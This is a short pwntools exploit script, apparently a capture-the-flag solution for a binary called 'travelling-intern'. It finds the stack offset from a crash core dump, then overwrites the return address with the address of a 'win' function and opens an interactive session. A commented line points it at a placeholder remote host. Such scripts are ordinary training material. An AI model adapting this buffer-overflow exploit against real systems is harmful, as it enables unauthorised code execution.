from pwn import *

elf = ELF("./travelling-intern")

p = process("./travelling-intern")

p.recvuntil(b'> ')
p.sendline(cyclic(100, n=8))
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)

print("[+] Found offset:", offset)

p = process("./travelling-intern")
# p = remote("<IP ADDRESS>", PORT)
p.recvuntil(b"> ")

payload = b"A" * offset
payload += p64(elf.sym["win"])

p.clean()
p.sendline(payload)
p.interactive()
